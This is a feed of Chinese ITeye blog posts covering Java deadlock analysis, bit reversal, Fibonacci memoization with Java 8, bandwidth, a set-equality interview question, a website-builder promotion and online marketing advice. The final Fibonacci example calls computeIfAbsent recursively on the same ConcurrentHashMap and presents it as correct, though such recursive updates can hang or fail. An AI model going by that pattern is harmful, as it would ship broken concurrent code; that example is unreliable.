	at com.journaldev.threads.SyncThread.run(ThreadDeadlock.java:41)
	- waiting to lock <0x000000013df2f668> (a java.lang.Object)
	- locked <0x000000013df2f658> (a java.lang.Object)
	at java.lang.Thread.run(Thread.java:722)
"t2":
	at com.journaldev.threads.SyncThread.run(ThreadDeadlock.java:41)
	- waiting to lock <0x000000013df2f678> (a java.lang.Object)
	- locked <0x000000013df2f668> (a java.lang.Object)
	at java.lang.Thread.run(Thread.java:722)
Found 1 deadlock.
从上面内容可以清楚的看到线程间因为公共资源，导致了死锁的出现。我们可以通过查看处于BLOCKED状态的线程，和那些它需要等待加锁的资源。每个资源都是有唯一ID的，我们可以发现在等的资源已经被其它线程给加锁了。比如"t3"线程在等着给资源"0x000000013df2f658"加锁，但该资源其实已经被"t1"线程给锁住了。当我们分析出了出现死锁情况的原因时，我们就要修改代码来避免这种情况了。避免死锁这里有些可供参考的指南，使我们可以避开大部分的死锁情况。避免嵌套锁：这是导致死锁的最普遍原因。当你已经给一个资源上锁后，避免再去锁住另一个。如果你只依赖于单个资源，基本上是不可能出现死锁现象的。比如下面的代码，是另一种run()方法的实现，它因为消除了嵌套锁从而避免了死锁现象。只对需要用到的加锁：你应该在你必须依赖该资源时，才想着去给它加锁。比如上面的例子，我锁住了整个Object资源，但如果我只需要用到它的某个字段，那我应该是对该特定的字段加锁，而不是锁住整个object。避免无限期等待：如果你的两个线程在进行thread join操作时，互相无限期的等待对方完成任务，就可能出现死锁。所以当你的线程必须要等待另一个线程完成任务时，最好加上一个最长等待时间。英文原文在这，由newhottopic.com翻译
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
反转比特位(文章最后有干货), rijin.iteye.com.blog.2033934, Thu, 20 Mar 2014 11:14:38 +0800

把一个无符号整数的比特位反转顺序。
有很多种方法来实现这个。我们这里给出一个算法：通过异或运算来交换，然后用分治方法来优化它。
提示：
你怎么把第i个和第j个位置的bit给交换了呢？如果你能用异或来实现，试着给出算法。
异或交换的小技巧：
如果一共有n个bit，反转它可以通过最少n/2次交换，最多n次交换来完成。技巧就在于实现一个交换函数swapBits(i,j)，用来交换位置在i和j的两个bit。你应该还记得异或运算：0 ^ 0 == 0, 1 ^ 1 == 0, 0 ^ 1 == 1, 和 1 ^ 0 == 1。
我们只要在第i位和第j位的bit不同时交换就行了。我们用异或来检测这两位bit是否相同。然后我们还需要切换这两个位置的bit值，我们可以再次用异或来完成操作。通过异或，两个位置的值都可以被切换了。
typedef unsigned int uint;
uint swapBits(uint x, uint i, uint j) {
  uint lo = ((x >> i) & 1);
  uint hi = ((x >> j) & 1);
  if (lo ^ hi) {
    x ^= ((1U << i) | (1U << j));
  }
  return x;
}
uint reverseXor(uint x) {
  uint n = sizeof(x) * 8;
  for (uint i = 0; i < n/2; i++) {
    x = swapBits(x, i, n-i-1);
  }
  return x;
}
 
（译者注：上面的其中一行代码：x ^= ((1U < < i) | (1U << j));是为了切换两个位置的bit值，可以看个例子：x = 1001，--> x ^= ((1U < < 1) | (1U << 3)) --> x = 1001 ^ (1010) –> x = 0011 ）
用这种异或方法来反转bit位的时间复杂度是O(n)，n是传入的无符号整数的比特位数。
分而治之：
记得归并排序是怎么做的吧？让我们看一下当n=8（一字节）时是怎么样的：
      01101001
    /         \
   0110      1001
  /   \     /   \
 01   10   10   01
 /\   /\   /\   /\
0 1  1 0  1 0  0 1
第一步是交换所有奇数和偶数位置的bit。然后交换连续成对的bit，依此类推……
因此，一共只要log(n)次操作就能完成。
下面的代码展示了一个特定的当n==32时的例子——当然，它也能很简单的去适配当n更大时的情况。
uint reverseMask(uint x) {
assert(sizeof(x) == 4); // special case: only works for 4 bytes (32 bits).
x = ((x & 0x55555555) << 1) | ((x & 0xAAAAAAAA) >> 1);
x = ((x & 0x33333333) << 2) | ((x & 0xCCCCCCCC) >> 2);
x = ((x & 0x0F0F0F0F) << 4) | ((x & 0xF0F0F0F0) >> 4);
x = ((x & 0x00FF00FF) <<  8) | ((x & 0xFF00FF00) >> 8);
x = ((x & 0x0000FFFF) << 16) | ((x & 0xFFFF0000) >> 16);
return x;
}
 
小记：
这不是反转bit位的唯一方法，也不是效率最高的。你想要探索更多关于反转bit位的算法/灵感，请访问这里：Bit Twiddling Hacks（译者注：该链接里真的很多好东东）。
英文原文在这里，由www.newhottopic.com翻译。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
为什么专业的Web设计师都在用Webydo了？, rijin.iteye.com.blog.2031676, Sun, 16 Mar 2014 11:59:45 +0800

当你要开始建立一个网站的时候，你通常第一反应想到的是设计，但紧接着就是要考虑到怎么用代码实现它的问题。想做出一个让用户眼前一亮且印象深刻的“现象级”网站是很难的，即使网页设计师设计出来了，但需要按照设计稿来编程实现的开发成本也会很高。尤其对于一名设计师来说，可能他要开销很高的费用来寻求一名合作开发者。目前市面上也有一些让你自由DIY设计并发布网站的建站平台，但只有3%的网站是通过这类平台生成的，而最主要的问题是这类平台太不专业了。
 
专业的在线建站平台Webydo正因如此孕育而生。它给专业的web或图片设计师们提供了一个可以创建和管理复杂网站的平台，并不需要开发人员的参与更不要写一行代码。
 
关于Webydo
Webydo是现在唯一一个给设计师们用来自由建站的专业平台，它目前已经为全球25000多名设计师所使用，建站数超过了90000个。该平台有着一套正在申请专利中的代码生成器，可以将网页设计稿直接转换成功能齐全、跨平台的响应式网站。让我们继续探究下它的更多功能：设计管理系统，内容管理系统，以及让他们能从竞争对手中脱颖而出的一些优势。
 
设计管理系统（DMS）
对于一般的DIY建站平台而言，因为他们在使用起来时所能提供的功能、创意都相当匮乏，导致设计师们最后都失去了使用的兴趣。但是Webydo让设计师们使用起来，感觉就跟用着自家的photoshop一样，甚至可以用很多高级特性，比如图层工具、阴影、设置转角半径及其它元素的属性，类似填充、描边这些。整个使用过程无非就是各种简单的推拽，设计师可以新建一个黑色画布背景，然后在上面尽情的设计，从基础的布局选项、填充空白，到从成千上万的备选模版中寻求灵感，都能满足。
 
内容管理系统（CMS）
为了更好的适应市场，Webydo提供了一个容易上手的内容管理系统。让设计师或者他们的客户们除了建站外，还可以在不涉及设计元素撰改的情况下去编辑和更新网站内容。
这个专业内容管理系统除了让Webydo可以用来建站，还提供了诸如打造品牌、原创或收藏文章、向你的客户收款等一些功能。你可以像使用一个功能齐全的博客一样来管理文章，文章当然是图文并茂的。它还可以任意增加你自己的logo，或者直接通过CMS来向你的客户收款。
他们这些好的功能点都是怎么来的呢？Webydo自己的设计师社区里经常会发起一些功能点的讨论和投票，工作人员根据与用户的互动来定夺下一版本的需求并实现。
 
发布网站
Webydo当然也提供了主机服务，并且有别于其它主机服务商，不需要设计师们去接触那些复杂的技术问题和设置。诸如DNS配置等一些技术性很强的操作都被做成自动化的了，可以直接发布网站在Webydo提供的主机上。
同时，Webydo的价格也是很有竞争力的。具体的可以去它们官网看下：www.webydo.com
总而言之，Webydo是个很优秀的平台，由设计师们打造，为设计师们服务。
 
本文英文原文在这,本人翻译首发于博客www.newhottopic.com，并非转载。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
这样实现Fibonacci最快最简单！, rijin.iteye.com.blog.2030464, Thu, 13 Mar 2014 14:04:34 +0800

大家都知道Fibonacci数列（一般译为斐波那契数列），比如：0, 1, 1, 2, 3, 5, 8, 13, 21...这是一个通过重复计算生成数列的好例子：f(n) = f(n-2) + f(n-1)。我们可以写一个计算第n个（从0开始）Fibonacci数的简单代码：
public class Fibonacci {
    public int fib(int n) {
        if (n == 0 || n == 1) return n;
        System.out.println("calculating fib(" + n + ")");
        return fib(n - 2) + fib(n - 1);
    }
}
 
让我们打印下计算第7个Fibonacci数的：
public class Main {
    public static void main(String[] args) {
        System.out.println("fib(7) = " + new Fibonacci().fib(7));
    }
}
 
结果如下：
calculating fib(7)
calculating fib(5)
calculating fib(3)
calculating fib(2)
calculating fib(4)
calculating fib(2)
calculating fib(3)
calculating fib(2)
calculating fib(6)
calculating fib(4)
calculating fib(2)
calculating fib(3)
calculating fib(2)
calculating fib(5)
calculating fib(3)
calculating fib(2)
calculating fib(4)
calculating fib(2)
calculating fib(3)
calculating fib(2)
fib(7) = 13
 
发现没，这样计算的步骤太多太复杂了！上面代码里有着严重的性能问题：fib(n)的调用次数随着n的增长呈指数级增长。
我们可以用一个加缓存的方法来优化，当然这个缓存是要线程安全的：
public class Fibonacci {
    private Map cache = new ConcurrentHashMap<>();
    public int fib(int n) {
        if (n == 0 || n == 1) return n;
        Integer result = cache.get(n);
        if (result == null) {
            synchronized (cache) {
                result = cache.get(n);
                if (result == null) {
                    System.out.println("calculating fib(" + n + ")");
                    result = fib(n - 2) + fib(n - 1);
                    cache.put(n, result);
                }
            }
        }
        return result;
    }
}
 
计算过程和结果如下：
calculating fib(7)
calculating fib(5)
calculating fib(3)
calculating fib(2)
calculating fib(4)
calculating fib(6)
fib(7) = 13
 
上面代码会先检查下缓存里的结果。如果这步调用还没有结果的，就计算出来并且把结果放进缓存。为了更好的性能，用了一个双重检查锁定（译者注：其实这里可以展开讨论下，为什么要加锁，如果不加锁会怎么样），可惜的是代码变复杂了。
 
Java8来拯救小伙伴们了！
 
让我们看下ConcurrentHashMap在Java8里一个新方法：
public V computeIfAbsent(K key, Function mappingFunction)
 
这个ConcurrentHashMap.computeIfAbsent有什么用呢？如果在map里没找到给定的key值所对应的entry，它会调用mappingFunction(key)来计算出哈希值，然后执行put(key,value)操作，整个过程都是保证原子性的。实际上它就是替我们完成了一堆在Java8版本前我们要自己写的脏活累活。这样现在的代码就非常简单了（当然还要感谢Java8里的新特性lambda）：
public class Fibonacci {
    private Map cache = new ConcurrentHashMap<>();
    public int fib(int n) {
        if (n == 0 || n == 1) return n;
        return cache.computeIfAbsent(n, (key) -> {
            System.out.println("calculating fib(" + n + ")");
            return fib(n - 2) + fib(n - 1);
        });
    }
}
 
当然，打印语句那里，还可以通过lambda继续简化：
public class Fibonacci {
    private Map cache = new ConcurrentHashMap<>();
    public int fib(int n) {
        if (n == 0 || n == 1) return n;
        return cache.computeIfAbsent(n, (key) -> fib(n - 2) + fib(n - 1));
    }
}
 
本文只是写了Java8里通过ConcurrentHashMap的一个新方法，简化了代码的小例子，其实Java8里让人点赞的新特性还有很多...
(英文原文出自这里)
本文同时发表在本人博客：www.newhottopic.com  ，并非转载。
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
你真的理解“带宽”含义吗？, rijin.iteye.com.blog.2028444, Sun, 09 Mar 2014 00:02:19 +0800

“带宽”这个词并不陌生，即使是非技术人员，普通的老百姓，也经常会提到，比如“我家换了10M带宽的光纤，速度嗷嗷的”，“谁在下载把带宽都占用了，视频看不了”。对于互联网行业的技术人员而言，在平时的网络调优、申请部署资源时，带宽也是个必不可少的参数。可是你真的知道带宽这个词所指的准确含义吗？
 
有些人从字面上的意思直观理解为带宽是类似于高速路的路面宽度。部分人知道带宽的单位是bits/s，即单位时间的比特数，所以理解为高速路上行驶的汽车的速度。这两种经常被“误解”的理解也没有太大的失误，反而对于“带宽”这个词的普及起了推动作用。但是如果做为一名关注性能的互联网从业人员而言，还是应该清楚其精确含义的。
 
如上文所提到的，带宽的单位是bit/s，所以100M带宽，应该指的是100Mbit/s，即“每秒100M的比特数”。那是不是就可以理解为上面提到的“汽车行驶速度”呢？其实这个理解应该称之为传输速度，与网络传输的介质、距离都是有关系的。
 
而带宽确切的含义应该是指数据的发送速度——在单位时间里，能发送的最大比特数。100M的带宽，就是指该网络里能发送数据的最大速度是100Mbit。
 
我们粗略的说下数据进入到网络传输的过程：程序内存里准备好数据——操作系统内核发出系统调用，进入内核缓冲区（队列形式）——CPU通知网卡控制器来取数据——网卡取数据是一个从内核缓冲区把数据拷贝到网卡缓冲区的过程——网卡缓冲区里的数据发送到网络中（线路中）。从这个过程里我们“顺便”理解了为什么平时会提到54M的网卡、百兆网卡这些概念：网卡发送数据速度的上限。
 
说到这我们可以想到：100M的带宽，是指有能力在单位时间里，发出上限为100M比特的数据。但是这些数据能按期望的都“准时”到达吗？这就要看网络的具体情况了：传输距离、传输介质、网络是否有堵塞（比如接收方跟不上处理速度导致）。所以并不是说带宽高了网络就肯定能好，这是两个概念。
 
那要提升带宽——数据发送速度时要考虑什么因素呢，是不是说有了百M网卡，就可以达到百M的bit/s了？我们回头看下上文提到的数据传输过程，可以知道网卡取数据和发数据只是其中的一个环节而已。所以往往还需要从以下几个因素来考虑优化：
 
1.数据发送装置将二进制信号传送到线路的能力，称之为信号传输频率。
 
2.对应第一点的，接收装置对二进制信号的接收能力。
 
3.数据传播介质的并行能力，这里比较像是“带宽的误解含义”，暂且称之为“宽度”吧。比如计算机总线的宽度，如32位、64位，光纤并行组成光缆，等等。
 
当然，数据传输过程中，还会有信号在介质中的衰减、受限于传输材料等因素，这些就属于通信技术范畴了。
 
本文同时发表在本人博客：www.newhottopic.com  ，并非转载。
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
一道面试题:怎么比较两个集合是否相等？, rijin.iteye.com.blog.1868186, Tue, 14 May 2013 00:42:07 +0800

先声明：本文内容是偏向于应用开发的，分析解答过程不适用于纯算法研发岗位。
 
朋友小P近来参加某互联网公司的电话面试，被问到一道题：怎么判断两个集合是否相等？注意，这是面试官的原话，一字不多，一字不少。
 
小P迅速回答道用哈希，对方在电话里也没有要求给出具体的解决方案，就问除了哈希还有别的方法吗？小P回答暂时没想到别的方法，对方也没继续追问，就进入到其它题目的问答。
 
今天聊起时感觉这是道不错的面试题：难度合适，可以根据不同的回答考察出不同类型的面试者，以及在整个展开的过程中可以初步了解到面试者水平层次，和其分析、解决问题的综合能力。
 
小P的回答，其实不是让人很满意——起码我是面试官的话我会觉得还有可以提升的地方。我不知道面试官的本意，但是在我看来，这么简短的一道题，应该本身就是设置了很多“坑”的——条件是缺失的，简短的题目并没有给出足够多的信息以便答题者“对症下药”。当然，考虑到是电话面试，以及小P较为欠缺的面试经验来看，其能迅速答出用哈希应该也算反应快且基础较为扎实。但是面试官没有进一步的去考察，猜测可能是对小P的“快速解答”有所失望（或者说没达到其预期），所以该题也就“点到为止”。
 
根据不同的面试职位，本题应该是有不同的侧重点的。小P面的是偏业务、应用的开发工程师。对于一名应用工程师而言，当碰到这么一道信息不足的题时，想到的是怎么来完善这些信息，然后再根据不同的场景以给出最优方案。这时的沟通、分析、探讨都很重要——其实还可以分享一个“秘密”：在一流的企业里，coding这项技能，应该只占应用开发工程师30%左右的比重，除此之外需要综合考虑的“软”能力还有很多。
 
回到这道题上。判断两个集合是否相等，我们最好先清楚这些：这是两个什么样的集合？有序的还是无序的？里面是有重复元素的还是已经各自去重的？集合的数据量大概是有多大？知道这个集合里数据的大概范围吗？相等的定义是什么？当两个集合里元素一样时还要求其顺序也一样吗？size==0的集合和null算相等吗？（后续更正：感谢有留言评论指出：“集合”的定义本身就包含了去重性、无序性的网友，经查资料确实如此，这里是作者之前疏忽了）
 
如果小P是按这个思路去跟面试官沟通，也许效果会更好。其实通过这些提问式的沟通，并不是说要炫我们的面试技巧，而是实事求是的去思考、分析题目。
 
如果说两个集合是去重的小范围内的正整数，那题目就退化的很简单了：此时我们可以用一个辅助数组来轻松解答。如集合A和集合B是落在[0,99]范围的去重正整数集合，那么new一个int[100]数组t，然后扫一遍A，把t[A[i]]赋值为非零（数组t的初始化各元素均为0）。再用一样的操作对B扫一遍，不过此时是对t[B[i]]赋值为0。最后第三遍扫数组t，如果t的元素还全是0则两集合相等。时间复杂度O(n)。其实这个思路也类似于小P提到的哈希，不过他回答的让人感觉太过于草率，没有任何分析，直接就答，搞的整个效果就是——你就那么一问，我就这么一答。
 
继续侃下这道题，如果没有这么多“恰当好处”的前提条件帮助，那又怎么解决呢？其实谁都懂的一个算法就是蛮力法：两个集合里的元素一一做比较呗。很多人看到这里是很不屑的：这有什么好答的。其实不然，最直观的方法最不容易出错。该题里用蛮力法的话时间复杂度是O(n^2)。如果集合的元素个数不多(多少算多呢？)，答题者直接回答这个也OK的——因为在我们最常用的JDK里，集合类的equals方法，都是这么实现的，我们来看下：
 
public boolean equals(Object o) {
	if (o == this)
	    return true;
	if (!(o instanceof Set))
	    return false;
	Collection c = (Collection) o;
	if (c.size() != size())
	    return false;
        try {
            return containsAll(c);
        } catch (ClassCastException unused)   {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }
    }
 
 
以上代码是JDK AbstractSet类里equals方法的实现，如果跟进去看到最后发现就是一个蛮力法一一比较的，没有什么技巧。什么，你不知道这个？JDK是最优秀的Java源码之一，你用Java没理由不去研读学习吧——不然确实是要对你的钻研精神、技术热情等持怀疑态度了——在优秀企业里，想招的都是那种真正有N年工作经验的人，而不是用一招鲜重复工作了N年的人。知其然更要知其所以然，这也是区分优秀者和平庸者的一个方法。
 
如果两个需要比较的集合数据量特别大怎么办？这时候我们可以考虑用下预处理了：是否能对两个集合提前排好序，然后在比较过程中查找元素时是否要用上二分查找？排序的开销，和直接查找的开销，是否要根据不同的业务场景来做个折中？如果只是一次性的操作也许排序的意义不大，但如果是需要大量重复操作的呢？如果是集合不变的，以及集合经常会发生变化的，采用的策略也不一样——经常发生变化的是否要去维护一个堆排序？
 
如果参加过ACM的同学也许还会想到蒙特卡罗算法（详情见这里）。
 
如果这道题是可以直接用现成第三方库类的，那JDK里已经有可以满足的了。
 
虽然在纯算法方面我也没能给出特别巧妙的解法，但我相信如果小P当时能按这个思路来回答，也许这道题就不会是草草收场，没准能跟面试官一起讨论出一个满意的结局。如果有谁有特别好的思路，欢迎留言探讨，共同进步。
 
本文同时发表在本人博客：www.newhottopic.com  ，并非转载。
已有 22 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
在互联网混，越分享越幸福, lusongsong.iteye.com.blog.2059725, Sun, 04 May 2014 16:23:09 +0800

会不会使用工具，是人和动物的根本区别。这是很早就刻在我们脑子里的一句话。这不能说它完全正确，也不能说它是错误的，只是远古时代某位科学家的一种理解而已。
 
后来，在另外一本书（非教科书）中读到这样一个观点：人和动物的根本区别是会不会分享资源。人类懂得通过分享和交换资源使自己的利益最大化，但是动物只会一味地通过争夺资源来满足自己的欲望。
 
每个人和每个动物的需求都是多种多样的。早期人类都是通过自己的一个人的力量来满足这种需求的。比如在狩猎阶段，一个人可能同时造弓箭、设陷阱、捕 杀猎物、屠宰猎物、烤制猎物等等，整个过程都是自己一个人完成的。但是后来出现分工之后，他发现把自己的弓箭拿出去跟别人交换猎物，比自己一个人捕杀的猎 物还要多，于是就专职做弓箭来换取猎物，最后可能演变成一个武器大王。
 
在有分工的背景下，一个人一般只能深耕于一个领域，在这个领域里面，自己制造的东西除了满足自己的需求以外，更多的是满足其他人的需求，满足他人的 同时，换取自己需要的东西，满足自己的需求。自己做出来的东西剩余越多，能换回来的东西就越多，更多更高层次的需求就能够满足起来了，这个人的生活就会比 较幸福。
 
这就验证了某些大师们常说的一个道理：给予越多，得到的就越多，人就会越幸福。其实，这都是利益交换的机制在运作。
 
 
人类通过分工使整个社会的生产效率大大提高，通过交换实现了资源利用最大化，最后整个社会的财富增加了，生活水平就提高了。而动物基本上没有分工与合作，只是在为了有限的资源拼个你死我活，没有文明，没有进步。
 
斗转星移，你我今天进入了互联网时代。互联网为这个时代大开方便之门，时间与空间的限制变得没那么要命了，人们更容易联系到认识或不认识的人，这是很了不起的一种进步。
 
前面提到的交换资源，第一前提是能够互相联系，第二前提是达成共识。这两个前提，线下只能通过集市、集镇等商业场地实现，而到了线上，人与人之间的通道一下子就被打通了，有广阔的发挥空间。
 
因此，互联网对你我来说，真的是一个很好的机会。你可以利用这个平台，更加频繁地进行各种各样的交换，满足自己各种各样的需求，过着各种各样幸福的生活。
 
当然，这是很理想的状态。通过互联网进行交换的早期阶段，其实就是早期的电子商务，也就是各种实物买卖；后来出现了虚物买卖，比如网站模板、话费、软件等等，这也属于电子商务的范畴。前两者都是比较露骨的买卖，是一种有偿的交换，大家各取所需。
 
后来，一些更虚的东西出现了，那就是资源的交换，这里所说的资源是免费的资源。这种交换，在互联网得到了最大的释放，及时、快速、涉及面广，史无前例。因此，互联网就是一个资源交换的大市场，甚至还没有太多的法律限制，尤其是中国互联网环境，各种无节操的大战时有发生。
 
这种资源交换不直接涉及金钱，但是处处埋藏着金矿。就像某些专家所说的，免费就是为了狠狠地收费。互联网就是一个资源的大熔炉，熔炉里的东西越多，参与其中的人就可以得到越多。也就是说，分享得越多，大家共享的资源就越多。只要大家都把东西拿出来，这个熔炉的整体价值才能提升，就像一个大卖场，商品越多，大家越能买到自己需要的东西。
 
当然，这是一种自发的分享，不分享也没人拦着你。有很多人是“看客”，就在那看着，自己有东西不拿出来，有想法也不说，自己觉得能够得到自己所需要的东西就可以。比如加群不说话的、注册微博不参与评论转发的、光下载不贡献内容的，都是看客流。
 
看客没有错，但是如果想要有更大的突破，就必须参与进去。
 
比如在一个技术交流圈里面，只有经常发言的，能够为别人解决问题的，当你发问的时候一定会得到别人的热心解答，你发动号召，别人也容易响应你。你甚至可以在群里成为一个意见领袖，有自己的品牌，顺便赚点钱别人也不会有意见。
 
举个活生生的例子。创立卢松松博客初期，坚持在博客圈中进行逐个回访、评论，日复一日，长期下来，几乎整个博客圈都被他逛遍了，而且他不是单次评 论，很多都是多次的、定期地评论。时间长了，大家能不注意到他吗？能不回访吗？这也是他的博客能够在站长圈中独占鳌头的原因之一。
 
如果博客圈子中的人都能够像卢松松这么活跃，起码独立博客不会那么容易就一个个死去，博客圈也一定可以创造出更多优质内容。如果各个圈子的人都多一 点参与和分享，能够共享的资源就越多，整个互联网环境就会越繁荣。就像一个国家，每个人都在一个专一的领域创造价值，分工越明确，剩余价值越多，能够拿出 来交换的就越多，整个国家就会变得更加富有（当然这是很理想的状态，实际情况受很多因素制约）。
 
在当下的站长圈子里，最抑郁的死法就是因为单打独斗、埋头苦干而活活累死的。一个人闷头单干的时代真的已经过去了，属于“互联网荒蛮时代”的做法，就像野蛮人只会争夺资源、不会共享资源一样。在当下这个很热闹的互联网时代，合作共赢才是生存之道。尤其是像站长这种个人或者三五个人创业的领域，不抱大腿，很难有存在感。
 
现在各种“抱大腿现象”风潮已经很常见了，或者说抱团更加合适。比如“千人站长抱团”、“自媒体联盟”、“微博互推联盟”、“博客互评互访俱乐部”、“优质内容合作联盟”等等，都是为了生存发展的需要而自发形成的。为了不被大佬吞食，草根阶层的抱团现象在所难免。抱在一起之后，资源共享变得更加有效率，整个圈子在互联网中的价值就会被放大，就像传统工业的“规模效应”。
 
所以，在互联网混，封闭是大忌。有些人搞自我封闭是为了防止自己的优质资源“外泄”，但是他们不知道这种封闭会阻断海量优质资源注入他们的体系，阻碍自己变大变强。懂得分享，就是张开怀抱拥抱更多优质资源，让自己的体系更加丰满强大。越分享，越幸福。
 
作为个人站长或者网络营销人员，除了要做好内容之外，寻找更多的BD合作是不可缺少的工作。内容只是一个基础，如果没有强大的互联网人脉，你的内容 可能会被一堆堆互联网垃圾压在底下，永无出头之日。无论身处哪个圈子，在圈子里创造价值，提供优质内容，积累并维持人脉资源，才能在保证不死的前提下获得 更好的发展。
 
 
云技术是互联网未来的大方向之一，也是大佬们非常看重的一块大蛋糕。未来谁拥有最强大的资源池，谁的地盘就最富饶，可见共享是多么强劲的一个势头。如果你看到了这股力量，就赶紧分享去吧。
» 文章版权：张飒的博客
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
竞价教程：新手如何快速寻找暴利产品, lusongsong.iteye.com.blog.2051775, Tue, 22 Apr 2014 11:52:13 +0800

大家都知道竞价很暴利，但是选择好的项目寻找合适的竞价产品，一直困扰着很多人尤其是新进入竞价这块的新手。本文将系统帮助你解决寻找暴利产品的问题!
这几天不断地有人来找我，说想做竞价，可是不知道产品怎么做，不知道产品该如何选择，不知道怎么着手去做一个产品。
我想这些问题并不是某几个人遇到的，而是只要做过竞价的人肯定都会遇到过这些问题，而且这是核心的问题!如果我们不把产品这一关过了，那么竞价肯定是做不好的，因为竞价卖的是什么?
是产品，那么就有好的有坏的，有赚钱的，有不赚钱的，如果不把产品彻底琢磨透了那竞价肯定是要亏本的。
1，暴利产品一定要保证利润
利润，还是利润!没有一定的利润支撑，面对高昂的广告成本，很可能就会造成赔本的结局。所以大家一定要努力寻找利润高一些的产品。
许多人总是专注于一些利润空间很低的产品，结果找了很多利润100，200的，甚至是几十块的，除去广告费，自己根本就不赚钱。
假设一个产品成本100，售价498，广告费100元出一单，那么你能赚498-100-100=298元，减去快递费，手续费等也就赚200多，这样还基本可以。
如果 产品售价在398或者298，那么我们一单才赚100多，很不划算。因为不管什么产品我们付出的精力和时间是一样的，那为什么不做销售价格高，利润高的产品呢?
笔者认为，很多产品只要稍加塑造价值，就可以高价销售，如果产品原来售价是498，那么如果你的价格是598，赚钱就会更加轻松！
所以，利润低的产品虽然竞争不激烈，但是想赚大钱，就要改变思路!
2，如何快速寻找产品
寻找产品一定要形成一种职业习惯，就是不断的研究广告，不断的研究产品卖点，不断的通过各种途径去操作产品。
寻找产品有如下几种途径：
A，通过淘宝或者阿里巴巴。大家都知道百度竞价的产品淘宝上面基本上都是有的，那么我们可以在淘宝上面搜索行业词(比如我们想做：早教，那就搜索这个关键字)，看看淘宝的自然排名和直通车广告，这样就会发现大量项目。
进入店铺之后呢，我们可以看到大量的产品，因为很多淘宝店他不是只做一款产品的，大量的同类产品就是我们寻找产品的最好机会。
当然，阿里巴巴店铺的产品寻找方法也和上诉雷同!马上去试试这个简单的方法吧!
B，通过百度搜狗等等搜索引擎和网盟广告。
这个方法也是用的最多的，笔者推荐大家多多用这个方法去寻找项目，原理和在淘宝阿里巴巴上面寻找产品是一样的。
我们想做某个类型的项目，就去搜索这个项目的行业词，然后一个个去研究对比广告，然后选出项目之后进一步分析这个项目的。
当然，网盟的广告也是要分析的，只要我们去百度搜索相关的关键字之后，网盟会自动给我们推送广告，什么广告投放力度最大，那么这个产品也就是相对热门了。
C，电视购物广告
这一点很简单，多关注各个电视台，多多研究电视购物广告。其实电视购物和竞价是相通的，很多电视购物的产品都在网络上有人做竞价，而且很多产品一般是现在电视上有，然后网络上就有了，所以，电视购物绝对是一个找产品最有效的途径。
这个就需要我们平时多多关注各大卫视，然后把相关广告都能够记录下来，拿到网络上面分析!
讲个简单的例子：以前一个电视购物广告刚刚上线的时候，百度上面没有推广，那天晚上我们广告上线，一个晚上出了40多单，包括这几天没有竞争对手进来，短短几天时间轻松赚钱!
所以一定要多多关注电视购物广告!
D，报纸或者杂志广告
大家在火车站或者汽车站的时候，经常等车的时候会发现有很多的报刊杂志，而且有很多是小报。这种刊物虽然内容质量不高，甚至很俗气，但是它们上面却有大量的广告。越是这种接地气的杂志，它的受众群体也越大。
我有个朋友以前就是专门做这种类型的广告的，效果相当不错;大家仔细研究就会发现很多网络上面热销的产品，在这些刊物上面都有踪迹。
所以，趁着闲暇的时间，多多收集这些广告，研究这些广告的文案，投放技巧等等，会不断提升你的实战技术和经验，丰富你赚钱的渠道。
当然，还有许多其他的平台，但是笔者认为大家抓住这样几个主流的平台，寻找项目，效果将会是事半功倍!
3，测试和执行，简单照做
笔者发现，新人最怕的有2点，低一点就是自以为聪明的去做事情，不遵循客观规律;第二点就是没有正确的指导，自测试4天，如果每天能稳定出单，或者利润大于投入的广告费，那就就可以做，然后放大就可以了。
如果一周测试一个产品，这样1个月就能测试出4个稳定盈利的产品，然后在逐步放大。每款产品在去除所有成本的前提下，赚300 块，如果一天出5单，那么每天也可以赚1500 以上。
虽然思路很简单，以后如果需要测试的话，还是需要注意的。比如广告排名的控制，如何通过关键字定位精准流量，这类型的产品目前是不是销售旺季等等。
后面的问题直接关系到你能不能在找到一个好项目之后，真正确保100%能够赚钱，确保能不能100%长期赚钱。
因为项目也有周期性，也有淡季和旺季。这个问题我们留以后再说，不在本文的讨论之列!
所以，有了好的产品，好的项目，有了科学的测试，有了深厚的项目操作经验和广告投放技巧，想不赚钱都是很难的。
找准方向，简单照做，成功非常容易!
当然，绝大多数人可能只是看看，觉得懂了，而不去实践。实践才是赚钱的最基本保证，看完之后马上去操作，你才配得上将来的财富!不过调查显示，绝大多数人都是打鸡血的冲动，只有不到3%的人真正走到了最后!
希望你是那3%的人，将来的某天也许你会感谢现在拼命的自己!
笔者广告圈，来源www.adwordsing.com 转自卢松松博客
​
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
80后屌丝站长自曝日赚6000(纯分享贴), lusongsong.iteye.com.blog.2050106, Sun, 20 Apr 2014 13:39:31 +0800

　　前两天在朋友圈分享了本站长日赚6000的光辉事迹，没想到一个妹子都没引来，结果却招来一片骂声，总结一下有两类声音比较强烈：一是说我催牛 逼不可信!二是说我经验分享得太少，未能解救仍处于贫下中农阶层的广大站长同胞。本人经过一番激烈的思想斗争，终于决定写下此完整分享版，一来给大家涨涨 姿势，打打鸡血!二来给我的站长同胞们提供一条发家致富奔小康的活路。
　　当然，我要指明一点，首先不保证看完此文谁都能挣到这笔，但机会对大家都是平等的。其二，Money肯定不是白白掉下来的，还是要花一点心思且对得起用户。
　　先介绍一下本论坛的情况，日IP也就在50到80之间波动吧(真他妈丢人!不过这样我都能挣到6000，你们掂量掂量吧!)是有点少，但这就是资源，是核心，是上帝!你必须非常明确。
